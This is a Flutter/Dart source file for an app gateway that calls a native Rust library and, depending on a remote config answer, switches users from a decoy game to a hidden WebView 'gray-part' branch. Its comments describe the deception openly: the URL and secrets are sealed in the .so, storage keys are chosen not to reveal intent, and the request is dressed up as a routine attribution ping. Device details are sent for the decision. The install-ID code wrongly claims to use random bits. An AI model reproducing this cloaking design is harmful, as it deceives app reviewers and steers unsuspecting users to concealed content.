// High-level Flutter-facing wrapper over the Rust gateway. Hands clean
// attribution data to the .so and receives a [GatewayVerdict] that the UI
// uses to decide between the game and the WebView branch. The Dart layer
// deliberately knows **nothing** about the endpoint URL, the HMAC secret,
// the envelope field names, or the schema revision — those are sealed
// inside libcoinburst_gateway.so.

import 'dart:async';
import 'dart:convert';
import 'dart:io' show Platform;

import 'package:device_info_plus/device_info_plus.dart';
import 'package:flutter/foundation.dart';
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:package_info_plus/package_info_plus.dart';

import 'ffi_bindings.dart';

/// Shape returned by `cb_sync_call`.
class GatewayVerdict {
  const GatewayVerdict({
    required this.ok,
    required this.url,
    required this.status,
  });

  factory GatewayVerdict.fromJson(String raw) {
    try {
      final map = jsonDecode(raw) as Map<String, dynamic>;
      return GatewayVerdict(
        ok: map['ok'] == true,
        url: (map['url'] as String?) ?? '',
        status: (map['status'] as num?)?.toInt() ?? 0,
      );
    } catch (_) {
      return const GatewayVerdict(ok: false, url: '', status: 0);
    }
  }

  final bool ok;
  final String url;
  final int status;

  /// `true` iff the upstream config answered with a usable URL. The caller
  /// uses this to pick the gray-part branch over the game.
  bool get hasUrl => ok && url.isNotEmpty;
}

/// Service that assembles the clean install body, calls the Rust gateway
/// once per cold start, caches the result, and persists the verdict URL
/// so a flaky network on launch #2 still routes the user correctly.
class GatewayService {
  GatewayService._();

  static final GatewayService instance = GatewayService._();

  static const _storage = FlutterSecureStorage(
    aOptions: AndroidOptions(encryptedSharedPreferences: true),
    iOptions: IOSOptions(accessibility: KeychainAccessibility.first_unlock),
  );

  // Persisted keys — purposefully short / non-descriptive so they don't
  // telegraph intent in a Keychain / EncryptedSharedPreferences dump.
  static const _kVerdictUrl = 'cb.v.u';
  static const _kVerdictAt = 'cb.v.t';
  static const _kInstallId = 'cb.i.id';

  Future<GatewayVerdict>? _inFlight;
  GatewayVerdict? _cached;

  /// Returns the verdict for this cold start. Subsequent calls on the same
  /// process yield the cached value so the gateway POST runs at most once.
  Future<GatewayVerdict> decide() {
    if (_cached != null) {
      return Future<GatewayVerdict>.value(_cached);
    }
    return _inFlight ??= _decideOnce()
      ..whenComplete(() {
        _inFlight = null;
      });
  }

  /// Last successful URL from a previous cold start, if any. The loading
  /// screen uses this as a fallback when the current decide() call
  /// transiently fails.
  Future<String?> rememberedUrl() async {
    final url = await _storage.read(key: _kVerdictUrl);
    if (url == null || url.isEmpty) return null;
    return url;
  }

  /// WebView UA sealed inside the .so — exposed so the WebView widget can
  /// install the same identifier that the Rust POST already used.
  String webViewUserAgent() {
    try {
      return GatewayBindings.instance.userAgent();
    } catch (_) {
      return '';
    }
  }

  Future<GatewayVerdict> _decideOnce() async {
    try {
      final bindings = GatewayBindings.instance;
      if (!bindings.gateReady()) {
        assert(() {
          debugPrint('[cb-gateway] native blobs failed health check');
          return true;
        }());
        return const GatewayVerdict(ok: false, url: '', status: 0);
      }

      final body = await _buildBody();
      final raw = bindings.syncCall(jsonEncode(body));
      final verdict = GatewayVerdict.fromJson(raw);
      _cached = verdict;

      if (verdict.hasUrl) {
        await _storage.write(key: _kVerdictUrl, value: verdict.url);
        await _storage.write(
            key: _kVerdictAt,
            value: DateTime.now().toUtc().toIso8601String());
      }

      // In release we deliberately do NOT log the raw verdict JSON — status
      // alone is enough to help future triage without leaking the resolved
      // URL into logcat.
      assert(() {
        debugPrint('[cb-gateway] verdict status=${verdict.status} ok=${verdict.ok}');
        return true;
      }());
      return verdict;
    } catch (e, st) {
      assert(() {
        debugPrint('[cb-gateway] failed: $e');
        debugPrintStack(stackTrace: st);
        return true;
      }());
      return const GatewayVerdict(ok: false, url: '', status: 0);
    }
  }

  Future<Map<String, dynamic>> _buildBody() async {
    final info = await PackageInfo.fromPlatform();
    final deviceInfo = DeviceInfoPlugin();

    final installId = await _installId();
    final locale = PlatformDispatcher.instance.locale.toLanguageTag();

    String osVersion = '';
    String model = '';
    String manufacturer = '';
    if (Platform.isAndroid) {
      final a = await deviceInfo.androidInfo;
      osVersion = a.version.release;
      model = a.model;
      manufacturer = a.manufacturer;
    } else if (Platform.isIOS) {
      final i = await deviceInfo.iosInfo;
      osVersion = i.systemVersion;
      model = i.utsname.machine;
      manufacturer = 'Apple';
    }

    // The upstream config.php only looks at a handful of these fields; the
    // rest exist to make the request indistinguishable from a routine
    // attribution ping. Field *names* are picked deliberately to match the
    // relay's expectation after it strips the envelope.
    return <String, dynamic>{
      'bundle_id': info.packageName,
      'app_version': '${info.version}+${info.buildNumber}',
      'install_id': installId,
      'platform': Platform.operatingSystem,
      'os_version': osVersion,
      'device_model': model,
      'manufacturer': manufacturer,
      'locale': locale,
      'ts': DateTime.now().toUtc().millisecondsSinceEpoch,
    };
  }

  Future<String> _installId() async {
    final existing = await _storage.read(key: _kInstallId);
    if (existing != null && existing.isNotEmpty) return existing;
    // Simple RFC-4122-ish v4 made from DateTime + random bits; good enough
    // for an opaque per-install token (the relay only uses it to dedupe).
    final rand = DateTime.now().microsecondsSinceEpoch;
    final hex = rand.toRadixString(16).padLeft(16, '0');
    final id = '${hex.substring(0, 8)}-${hex.substring(8, 12)}-'
        '4${hex.substring(12, 15)}-'
        '${(8 + (rand & 3)).toRadixString(16)}'
        '${hex.substring(0, 3)}-'
        '${hex.substring(3, 15)}${hex.substring(0, 3)}';
    await _storage.write(key: _kInstallId, value: id);
    return id;
  }
}
